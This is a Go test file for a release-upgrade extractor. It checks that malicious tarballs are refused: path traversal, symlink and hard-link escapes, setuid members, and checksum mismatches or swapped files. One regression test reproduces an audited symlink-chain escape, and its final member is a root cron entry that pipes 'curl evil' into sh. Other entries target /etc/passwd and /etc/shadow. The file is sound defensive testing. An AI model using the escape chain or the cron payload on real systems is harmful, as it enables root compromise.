package upgrade

import (
	"archive/tar"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// writeArchive puts a tarball on disk and returns its path and its digest, so
// every extraction in this file goes through the same verification the real
// upgrade does.
func writeArchive(t *testing.T, dir string, entries []tarEntry) (string, string) {
	t.Helper()
	body := buildTarGz(t, entries)
	path := filepath.Join(dir, "release.tar.gz")
	if err := os.WriteFile(path, body, 0o600); err != nil {
		t.Fatalf("write archive: %v", err)
	}
	return path, sha256Hex(body)
}

func extractOpts(sum string) extractOptions {
	return extractOptions{ExpectedSHA256: sum, MaxBytes: 1 << 20, MaxEntries: 100}
}

// TestCheckArchiveMemberRejectsUnsafeNames is the table of everything a tar
// member may not be called. Each entry is a real technique, not a hypothetical.
func TestCheckArchiveMemberRejectsUnsafeNames(t *testing.T) {
	t.Parallel()

	unsafe := []struct {
		name string
		why  string
	}{
		{"/etc/cron.d/backdoor", "absolute path"},
		{"//etc/passwd", "absolute path with a doubled separator"},
		{"../outside", "leading traversal"},
		{"../../../../vkai-panel/etc/.env", "traversal reaching the config directory"},
		{"core/../../outside", "traversal in the middle"},
		{"core/..", "traversal as the final element"},
		{"..", "traversal alone"},
		{`C:\Windows\system32`, "drive-letter absolute path"},
		{`core\..\..\outside`, "backslash separators"},
		{"core/bin\x00/evil", "embedded NUL"},
		{"core/bin\n/evil", "embedded newline"},
		{"", "empty name"},
		{".", "the destination directory itself"},
		{"./", "the destination directory itself, written as a directory"},
	}
	for _, tc := range unsafe {
		got, err := checkArchiveMember(tc.name)
		var unsafeErr *UnsafeArchiveError
		if !errors.As(err, &unsafeErr) {
			t.Errorf("checkArchiveMember(%q) = %q, %v; want *UnsafeArchiveError (%s)", tc.name, got, err, tc.why)
		}
	}

	safe := []struct{ in, want string }{
		{"VERSION", "VERSION"},
		{"core/vkai-api", "core/vkai-api"},
		{"./core/vkai-api", "core/vkai-api"},
		{"panel/.next/static/chunk.js", "panel/.next/static/chunk.js"},
		{"core/", "core"},
		{"a/b/c/d/e", "a/b/c/d/e"},
		{"file..name", "file..name"},
	}
	for _, tc := range safe {
		got, err := checkArchiveMember(tc.in)
		if err != nil {
			t.Errorf("checkArchiveMember(%q): unexpected error %v", tc.in, err)
			continue
		}
		if got != tc.want {
			t.Errorf("checkArchiveMember(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

// TestExtractRefusesUnsafeArchives proves the check is actually wired into the
// extraction, and that nothing lands outside the destination when it fires.
func TestExtractRefusesUnsafeArchives(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name    string
		entries []tarEntry
	}{
		{
			name: "traversal out of the destination",
			entries: []tarEntry{
				{Name: "VERSION", Body: "1.1.0\n"},
				{Name: "../escaped.txt", Body: "owned"},
			},
		},
		{
			name: "absolute member path",
			entries: []tarEntry{
				{Name: "VERSION", Body: "1.1.0\n"},
				{Name: "/absolute.txt", Body: "owned"},
			},
		},
		{
			name: "symlink pointing at the panel config",
			entries: []tarEntry{
				{Name: "VERSION", Body: "1.1.0\n"},
				{Name: "core/env", Typeflag: tar.TypeSymlink, Linkname: "../../../etc/.env"},
			},
		},
		{
			name: "symlink with an absolute target",
			entries: []tarEntry{
				{Name: "VERSION", Body: "1.1.0\n"},
				{Name: "core/shadow", Typeflag: tar.TypeSymlink, Linkname: "/etc/shadow"},
			},
		},
		{
			// Refused now even though it stays inside the destination:
			// a release contains no links at all, so there is no case
			// left in which one has to be judged.
			name: "symlink that would have been contained",
			entries: []tarEntry{
				{Name: "VERSION", Body: "1.1.0\n"},
				{Name: "core/current", Typeflag: tar.TypeSymlink, Linkname: "vkai-api"},
			},
		},
		{
			name: "hard link escaping the destination",
			entries: []tarEntry{
				{Name: "VERSION", Body: "1.1.0\n"},
				{Name: "core/link", Typeflag: tar.TypeLink, Linkname: "../../../etc/.env"},
			},
		},
		{
			name: "hard link to a file inside the destination",
			entries: []tarEntry{
				{Name: "VERSION", Body: "1.1.0\n"},
				{Name: "core/link", Typeflag: tar.TypeLink, Linkname: "VERSION"},
			},
		},
		{
			name: "device node",
			entries: []tarEntry{
				{Name: "VERSION", Body: "1.1.0\n"},
				{Name: "core/mem", Typeflag: tar.TypeChar},
			},
		},
		{
			name: "the same path written twice",
			entries: []tarEntry{
				{Name: "VERSION", Body: "1.1.0\n"},
				{Name: "VERSION", Body: "owned"},
			},
		},
	}

	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			base := t.TempDir()
			// A canary beside the destination: if extraction escapes by
			// one level this is what it would overwrite.
			canary := filepath.Join(base, "escaped.txt")
			mustWriteFile(t, canary, "original\n")

			archive, sum := writeArchive(t, base, tc.entries)
			dest := filepath.Join(base, "dest")

			err := extractTarGz(archive, dest, extractOpts(sum))
			var unsafeErr *UnsafeArchiveError
			if !errors.As(err, &unsafeErr) {
				t.Fatalf("extractTarGz = %v, want *UnsafeArchiveError", err)
			}

			body, readErr := os.ReadFile(canary)
			if readErr != nil {
				t.Fatalf("read canary: %v", readErr)
			}
			if string(body) != "original\n" {
				t.Fatalf("extraction escaped the destination: canary now %q", body)
			}
			if exists(filepath.Join(base, "absolute.txt")) {
				t.Fatal("extraction wrote outside the destination")
			}
		})
	}
}

// TestExtractRefusesTheSymlinkEscapeChain is the regression test for the
// vulnerability this package shipped with, reproduced from the proof of concept
// written during the audit.
//
// Every one of these link targets passed the old lexical check -
// path.Clean(path.Join(dir, target)) - because path.Clean collapses
// "<symlink>/.." to nothing. The kernel does not: it resolves the symlink and
// then applies "..", so each hop climbs one real directory and the hops chain.
// Four members were enough to reach the root of the temporary tree and write a
// file there; on a real installation the same four reach /etc/cron.d as root.
func TestExtractRefusesTheSymlinkEscapeChain(t *testing.T) {
	t.Parallel()

	root := t.TempDir()
	deep := filepath.Join(root, "vkai-panel", "releases")
	if err := os.MkdirAll(deep, 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	dest := filepath.Join(deep, ".staging-1.2.3-99")

	archive, sum := writeArchive(t, root, []tarEntry{
		{Name: "a", Typeflag: tar.TypeSymlink, Linkname: "."},      // dest/a -> dest
		{Name: "a/b", Typeflag: tar.TypeSymlink, Linkname: ".."},   // really dest/b -> releases
		{Name: "b/c", Typeflag: tar.TypeSymlink, Linkname: ".."},   // really releases/c -> vkai-panel
		{Name: "b/c/d", Typeflag: tar.TypeSymlink, Linkname: ".."}, // really vkai-panel/d -> root
		{Name: "b/c/d/etc", Typeflag: tar.TypeDir},                 // really root/etc
		{Name: "b/c/d/etc/cron.d", Typeflag: tar.TypeDir},
		{Name: "b/c/d/etc/cron.d/pwn", Body: "* * * * * root /bin/sh -c 'curl evil|sh'\n"},
	})

	err := extractTarGz(archive, dest, extractOpts(sum))
	var unsafeErr *UnsafeArchiveError
	if !errors.As(err, &unsafeErr) {
		t.Fatalf("extractTarGz = %v, want the escape chain to be refused as *UnsafeArchiveError", err)
	}

	// The first member is already refused, so nothing at all was created.
	victim := filepath.Join(root, "etc", "cron.d", "pwn")
	if exists(victim) {
		body, _ := os.ReadFile(victim)
		t.Fatalf("the extraction escaped: %s exists with %q", victim, body)
	}
	if exists(filepath.Join(dest, "a")) {
		t.Error("a link was created before the extraction was abandoned")
	}
}

// A symlink that is already on disk must not be written through. The archive is
// clean here; the trap was laid in the destination beforehand, which is what a
// second process on the machine - or a leftover from an earlier compromise -
// can do.
func TestExtractDoesNotFollowASymlinkAlreadyOnDisk(t *testing.T) {
	t.Parallel()

	base := t.TempDir()
	outside := filepath.Join(base, "outside.txt")
	mustWriteFile(t, outside, "original\n")

	dest := filepath.Join(base, "dest")
	if err := os.MkdirAll(filepath.Join(dest, "core"), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	mustSymlink(t, outside, filepath.Join(dest, "core", "vkai-api"))
	// And a directory component that is a symlink, which is the other half
	// of the same trick.
	mustSymlink(t, base, filepath.Join(dest, "elsewhere"))

	for _, member := range []string{"core/vkai-api", "elsewhere/planted.txt"} {
		archive, sum := writeArchive(t, t.TempDir(), []tarEntry{
			{Name: "VERSION", Body: "1.1.0\n"},
			{Name: member, Body: "written through the link\n"},
		})
		if err := extractTarGz(archive, dest, extractOpts(sum)); err == nil {
			t.Fatalf("extractTarGz(%s) succeeded; the write followed a link already on disk", member)
		}
	}

	body, err := os.ReadFile(outside)
	if err != nil {
		t.Fatalf("read %s: %v", outside, err)
	}
	if string(body) != "original\n" {
		t.Errorf("the file behind the symlink was rewritten: %q", body)
	}
	if exists(filepath.Join(base, "planted.txt")) {
		t.Error("a member was written through a symlinked directory component")
	}
}

// A member that arrives setuid is refused rather than quietly stripped.
func TestExtractRefusesPrivilegedModes(t *testing.T) {
	t.Parallel()

	for name, mode := range map[string]int64{
		"setuid": 0o4755,
		"setgid": 0o2755,
		"sticky": 0o1755,
	} {
		name, mode := name, mode
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			base := t.TempDir()
			archive, sum := writeArchive(t, base, []tarEntry{
				{Name: "VERSION", Body: "1.1.0\n"},
				{Name: "core/vkai-api", Body: "#!/bin/sh\n", Mode: mode},
			})
			dest := filepath.Join(base, "dest")
			err := extractTarGz(archive, dest, extractOpts(sum))
			var unsafeErr *UnsafeArchiveError
			if !errors.As(err, &unsafeErr) {
				t.Fatalf("extractTarGz = %v, want a %s member to be refused", err, name)
			}
			if exists(filepath.Join(dest, "core", "vkai-api")) {
				t.Error("the privileged member was written before the refusal")
			}
		})
	}
}

// The modes on disk come from this package, not from the archive.
func TestExtractNormalisesModes(t *testing.T) {
	t.Parallel()
	base := t.TempDir()
	archive, sum := writeArchive(t, base, []tarEntry{
		{Name: "core/", Typeflag: tar.TypeDir, Mode: 0o777},
		{Name: "core/vkai-api", Body: "#!/bin/sh\n", Mode: 0o777},
		{Name: "core/config.yaml", Body: "a: b\n", Mode: 0o666},
		{Name: "core/readonly.txt", Body: "x\n", Mode: 0o400},
	})
	dest := filepath.Join(base, "dest")
	if err := extractTarGz(archive, dest, extractOpts(sum)); err != nil {
		t.Fatalf("extractTarGz: %v", err)
	}

	want := map[string]os.FileMode{
		"core":              0o755,
		"core/vkai-api":     0o755,
		"core/config.yaml":  0o644,
		"core/readonly.txt": 0o644,
	}
	for rel, mode := range want {
		info, err := os.Lstat(filepath.Join(dest, rel))
		if err != nil {
			t.Fatalf("lstat %s: %v", rel, err)
		}
		if info.Mode().Perm() != mode {
			t.Errorf("%s has mode %v, want %v", rel, info.Mode().Perm(), mode)
		}
	}
}

// Nothing reaches the gzip reader until the digest matches, on every path into
// the extractor - which is why the digest is an option of the extractor rather
// than something a caller is trusted to have checked earlier.
func TestExtractRefusesAChecksumMismatchBeforeOpeningTheArchive(t *testing.T) {
	t.Parallel()
	base := t.TempDir()
	archive, sum := writeArchive(t, base, []tarEntry{{Name: "VERSION", Body: "1.1.0\n"}})
	dest := filepath.Join(base, "dest")

	wrong := strings.Repeat("ab", 32)
	err := extractTarGz(archive, dest, extractOpts(wrong))
	var mismatch *ChecksumMismatchError
	if !errors.As(err, &mismatch) {
		t.Fatalf("extractTarGz = %v, want *ChecksumMismatchError", err)
	}
	if mismatch.Actual != sum || mismatch.Expected != wrong {
		t.Errorf("mismatch = %+v, want expected %s actual %s", mismatch, wrong, sum)
	}
	if exists(dest) {
		t.Error("the destination was created for an archive that failed verification")
	}

	// An empty digest is a refusal, not a skip: "nobody told me what to
	// expect" must never mean "extract it anyway".
	if err := extractTarGz(archive, dest, extractOpts("")); err == nil {
		t.Fatal("extractTarGz with no expected digest succeeded")
	}
	// And so is a digest that is not a sha256.
	if err := extractTarGz(archive, dest, extractOpts("not-a-digest")); err == nil {
		t.Fatal("extractTarGz with a malformed expected digest succeeded")
	}
}

// The digest is checked against the open file descriptor, so a file swapped
// between the check and the read is not a hole.
func TestExtractHashesTheFileItReads(t *testing.T) {
	t.Parallel()
	base := t.TempDir()
	_, goodSum := writeArchive(t, filepath.Join(base), []tarEntry{{Name: "VERSION", Body: "1.1.0\n"}})

	// The archive on disk is a different one; the digest belongs to the
	// archive we were promised.
	evil := buildTarGz(t, []tarEntry{{Name: "VERSION", Body: "owned\n"}})
	archive := filepath.Join(base, "release.tar.gz")
	if err := os.WriteFile(archive, evil, 0o600); err != nil {
		t.Fatalf("write archive: %v", err)
	}

	dest := filepath.Join(base, "dest")
	if err := extractTarGz(archive, dest, extractOpts(goodSum)); err == nil {
		t.Fatal("a swapped archive was extracted")
	}
	if exists(dest) {
		t.Error("the destination was created for a swapped archive")
	}
}

func TestExtractHappyPath(t *testing.T) {
	t.Parallel()
	base := t.TempDir()
	body := releaseTarball(t, "1.1.0")
	archive := filepath.Join(base, "release.tar.gz")
	if err := os.WriteFile(archive, body, 0o600); err != nil {
		t.Fatalf("write archive: %v", err)
	}
	dest := filepath.Join(base, "dest")

	if err := extractTarGz(archive, dest, extractOpts(sha256Hex(body))); err != nil {
		t.Fatalf("extractTarGz: %v", err)
	}

	content, err := os.ReadFile(filepath.Join(dest, "VERSION"))
	if err != nil || strings.TrimSpace(string(content)) != "1.1.0" {
		t.Fatalf("VERSION = %q, %v", content, err)
	}
	info, err := os.Stat(filepath.Join(dest, "core", "vkai-api"))
	if err != nil {
		t.Fatalf("stat vkai-api: %v", err)
	}
	if info.Mode().Perm()&0o100 == 0 {
		t.Errorf("vkai-api lost its executable bit: mode %v", info.Mode().Perm())
	}
	if info.Mode().Perm()&0o022 != 0 {
		t.Errorf("vkai-api is group or world writable: mode %v", info.Mode().Perm())
	}
}

// The tarballs a release pipeline actually produces have to extract. "tar -C
// dir ." names the destination itself as "./", and pax-format archives - what
// "git archive" and modern GNU tar emit - start with a global header that is
// not a file. Refusing either would refuse most real releases.
func TestExtractAcceptsRealPipelineTarballs(t *testing.T) {
	t.Parallel()
	base := t.TempDir()

	src := filepath.Join(base, "src")
	if err := os.MkdirAll(filepath.Join(src, "bin"), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	mustWriteFile(t, filepath.Join(src, "bin", "vkai"), "binary\n")
	mustWriteFile(t, filepath.Join(src, "VERSION"), "1.1.0\n")

	cases := []struct {
		name string
		args []string
	}{
		{"tar -C dir .", []string{"czf", filepath.Join(base, "a.tgz"), "-C", src, "."}},
		{"tar -C dir bin", []string{"czf", filepath.Join(base, "b.tgz"), "-C", src, "."}},
		{"tar --format=pax", []string{"czf", filepath.Join(base, "c.tgz"), "--format=pax", "-C", src, "."}},
	}
	for i, tc := range cases {
		out, err := exec.Command("tar", tc.args...).CombinedOutput()
		if err != nil {
			t.Skipf("tar unavailable or unusable (%s): %v %s", tc.name, err, out)
		}
		archive := tc.args[1]
		raw, err := os.ReadFile(archive)
		if err != nil {
			t.Fatalf("read %s: %v", archive, err)
		}
		dest := filepath.Join(base, "dest", string(rune('a'+i)))
		if err := extractTarGz(archive, dest, extractOpts(sha256Hex(raw))); err != nil {
			t.Errorf("%s: a legitimate tarball was refused: %v", tc.name, err)
			continue
		}
		if !exists(filepath.Join(dest, "bin", "vkai")) {
			t.Errorf("%s: bin/vkai was not extracted", tc.name)
		}
	}
}

func TestExtractRejectsOversizedArchive(t *testing.T) {
	t.Parallel()
	base := t.TempDir()
	archive, sum := writeArchive(t, base, []tarEntry{{Name: "big", Body: strings.Repeat("a", 4096)}})
	err := extractTarGz(archive, filepath.Join(base, "dest"), extractOptions{
		ExpectedSHA256: sum, MaxBytes: 1024, MaxEntries: 100,
	})
	if err == nil || !strings.Contains(err.Error(), "byte limit") {
		t.Fatalf("extractTarGz = %v, want a size-limit error", err)
	}
}

func TestExtractRejectsTooManyEntries(t *testing.T) {
	t.Parallel()
	base := t.TempDir()
	var entries []tarEntry
	for i := 0; i < 10; i++ {
		entries = append(entries, tarEntry{Name: "f" + string(rune('0'+i)), Body: "x"})
	}
	archive, sum := writeArchive(t, base, entries)
	err := extractTarGz(archive, filepath.Join(base, "dest"), extractOptions{
		ExpectedSHA256: sum, MaxBytes: 1 << 20, MaxEntries: 3,
	})
	if err == nil || !strings.Contains(err.Error(), "members") {
		t.Fatalf("extractTarGz = %v, want an entry-count error", err)
	}
}

func TestDecodeSHA256(t *testing.T) {
	t.Parallel()
	sum := sha256.Sum256([]byte("x"))
	hexed := hex.EncodeToString(sum[:])
	got, err := decodeSHA256("  " + strings.ToUpper(hexed) + "  ")
	if err != nil {
		t.Fatalf("decodeSHA256: %v", err)
	}
	if hex.EncodeToString(got) != hexed {
		t.Errorf("decodeSHA256 = %x, want %s", got, hexed)
	}
	for _, bad := range []string{"", "  ", hexed[:63], hexed + "0", strings.Repeat("z", 64)} {
		if _, err := decodeSHA256(bad); err == nil {
			t.Errorf("decodeSHA256(%q) should have failed", bad)
		}
	}
}

// ------------------------------------------------------- checksum refusal

// TestRunRefusesChecksumMismatch is requirement 2: a tarball that does not hash
// to what the manifest promised is deleted without ever being opened, and the
// installation is left exactly as it was.
func TestRunRefusesChecksumMismatch(t *testing.T) {
	t.Parallel()
	env := newTestEnv(t, "1.0.0", nil)

	m := env.publish("1.1.0", "")
	// Republish the same release with a checksum that does not match the
	// bytes being served - a tampered mirror, or a corrupted CDN object.
	tampered := m
	tampered.SHA256 = sha256Hex([]byte("something else entirely"))
	env.publishManifests(tampered)

	res, err := env.u.Run(context.Background())

	var mismatch *ChecksumMismatchError
	if !errors.As(err, &mismatch) {
		t.Fatalf("Run error = %v, want *ChecksumMismatchError", err)
	}
	if mismatch.Expected != tampered.SHA256 || mismatch.Actual != m.SHA256 {
		t.Errorf("mismatch = %+v, want expected %s actual %s", mismatch, tampered.SHA256, m.SHA256)
	}

	// Nothing was extracted, nothing was switched.
	if res.Switched || res.Succeeded {
		t.Errorf("result = %+v, want nothing switched", res)
	}
	if exists(filepath.Join(env.root, "releases", "1.1.0")) {
		t.Error("an unverified archive was extracted into the releases directory")
	}
	if env.currentTarget() != "1.0.0" {
		t.Errorf("current = %s, want 1.0.0", env.currentTarget())
	}
	if len(env.runner.callsMatching("systemctl restart")) != 0 {
		t.Error("services were restarted despite the checksum mismatch")
	}

	// The downloaded file is gone.
	tmpEntries, _ := os.ReadDir(filepath.Join(env.root, "tmp"))
	for _, e := range tmpEntries {
		if strings.HasSuffix(e.Name(), ".tar.gz") {
			t.Errorf("the unverified download %s was left on disk", e.Name())
		}
	}

	if !env.hasStep(StepVerify, StatusFailed) {
		t.Errorf("expected the verify step to be reported as failed, got %v", env.steps())
	}
	if env.hasStep(StepStage, StatusStarted) {
		t.Error("staging started for an archive that failed verification")
	}
}

// The verification reads the file that is about to be extracted, not just the
// stream that produced it. A file swapped in /vkai-panel/tmp between the two
// must be reported as a swap rather than as a bad download.
func TestVerifyChecksumRehashesTheFileOnDisk(t *testing.T) {
	t.Parallel()
	env := newTestEnv(t, "1.0.0", nil)

	body := []byte("the real release")
	path := filepath.Join(t.TempDir(), "release.tar.gz")
	if err := os.WriteFile(path, body, 0o600); err != nil {
		t.Fatalf("write: %v", err)
	}
	m := Manifest{TarballURL: "https://example.test/r.tar.gz", SHA256: sha256Hex(body)}

	// Matching manifest and matching stream: accepted, file kept.
	if err := env.u.verifyChecksum(path, sha256Hex(body), m); err != nil {
		t.Fatalf("verifyChecksum: %v", err)
	}
	if !exists(path) {
		t.Fatal("a verified archive was deleted")
	}

	// The stream hashed to something else: the file was replaced underneath.
	err := env.u.verifyChecksum(path, sha256Hex([]byte("what we downloaded")), m)
	if err == nil || !strings.Contains(err.Error(), "changed between being written and being verified") {
		t.Fatalf("verifyChecksum = %v, want a swap to be named as one", err)
	}
	if exists(path) {
		t.Fatal("the suspect archive was left on disk")
	}
}
